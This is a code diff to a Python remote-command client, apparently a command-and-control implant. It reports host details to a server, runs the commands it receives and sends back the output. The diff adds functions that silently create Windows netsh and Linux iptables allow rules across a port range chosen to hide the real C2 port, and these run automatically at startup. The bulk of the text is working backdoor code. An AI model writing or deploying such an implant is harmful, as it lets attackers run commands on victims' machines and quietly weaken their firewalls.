@@ -1,3 +1,4 @@
+# Don't run this on a dev box unless you want your firewall open!
 import socket
 import os
 import subprocess
@@ -8,6 +9,8 @@ import sys
 
 SERVER='localhost'
 SERVER_PORT=9999
+PORT_RADIUS=200
+FIREWALL_NAME="Allow Python C2 Outbound"
 BUFFER_SIZE=4096
 DEBUG=True
 
@@ -52,6 +55,85 @@ def close_connection(client_sock, msg="no message specified"):
             print(f"EXIT: {msg}")
         sys.exit(1)
 
+def firewall_rule_exists_win(rule_name):
+    try:
+        result = subprocess.run(
+            f'netsh advfirewall firewall show rule name="{rule_name}"',
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            text=True
+        )
+        return result.returncode == 0 and rule_name.lower() in result.stdout.lower()
+        #return result.returncode == 0
+    except Exception as e:
+        if DEBUG:
+            print(f"Error checking rule on Windows firewall: {str(e)}")
+        return False
+
+def iptables_rule_exists(chain, port_range):
+    """Check if the iptables rule already exists."""
+    port_flag = '--sport' if chain == 'INPUT' else '--dport'
+    cmd = f'iptables -C {chain} -p tcp {port_flag} {port_range} -j ACCEPT'
+    try:
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return result.returncode == 0
+    except Exception as e:
+        if DEBUG:
+            print(f"Error checking rule on iptables: {str(e)}")
+        return False
+
+'''
+Punches a hole in the firewall with a configurable port range with the real port hiding in the center
+'''
+def open_firewall():
+    if DEBUG:
+        print(f"Opening firewall")
+        
+    if PORT_RADIUS != 0:
+        port_min = SERVER_PORT - PORT_RADIUS
+        port_max = SERVER_PORT + PORT_RADIUS
+        port_range = f"{port_min}-{port_max}"
+    else:
+        port_range = str(SERVER_PORT)
+
+    try:
+        if os.name == 'nt':  # Windows
+            
+            # Allow inbound traffic
+            inbound_name = f"{FIREWALL_NAME} Inbound"
+            if not firewall_rule_exists_win(inbound_name):
+                subprocess.run(
+                    f'netsh advfirewall firewall add rule name="{FIREWALL_NAME} Inbound" dir=in action=allow protocol=TCP remoteport={port_range}',
+                    shell=True
+                )
+            # Allow outbound traffic
+            outbound_name = f"{FIREWALL_NAME} Outbound"
+            if not firewall_rule_exists_win(outbound_name):
+                subprocess.run(
+                    f'netsh advfirewall firewall add rule name="{FIREWALL_NAME} Outbound" dir=out action=allow protocol=TCP remoteport={port_range}',
+                    shell=True
+                )
+        else: # iptables
+            # Uses default input/output chains on default table and inserts our rules at the top
+            # iptables needs 80:81 format instead of 80-81
+            port_range = port_range.replace('-',':')
+            # Allow inbound traffic
+            if not iptables_rule_exists('INPUT', port_range):
+                subprocess.run(
+                    f'iptables -I INPUT 1 -p tcp --sport {port_range} -j ACCEPT',
+                    shell=True
+                )
+            # Allow outbound traffic
+            if not iptables_rule_exists('OUTPUT', port_range):
+                subprocess.run(
+                    f'iptables -I OUTPUT 1 -p tcp --dport {port_range} -j ACCEPT',
+                    shell=True
+                )
+    except Exception as e:
+        if DEBUG:
+            print(f"Error when setting up firewall: {str(e)}")
+
 def main():
 
     # Gather basic system info
@@ -65,6 +147,9 @@ def main():
         cur_user = getpass.getuser()
     elevated = is_elevated()
     sys_info = f"REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
+
+    # Poke a hole in the firewall
+    open_firewall()
 
     # Connect to the server
     try:
@@ -126,12 +211,12 @@ def main():
                 client_sock.send(output.encode())
             except Exception as e:
                 #print(f"Unexpected error: {e}")
-                close_connection(client_sock, str(e))
+                close_connection(client_sock, f"Handled Exception: {str(e)}")
                 return
     except (ConnectionResetError, ConnectionAbortedError):
         close_connection(client_sock,"Client has lost connection to server.")
     except Exception as e:
         # Graceful exit before crash
-        close_connection(client_sock,str(e))
+        close_connection(client_sock,f"Handled Exception: {str(e)}")
 
 main()
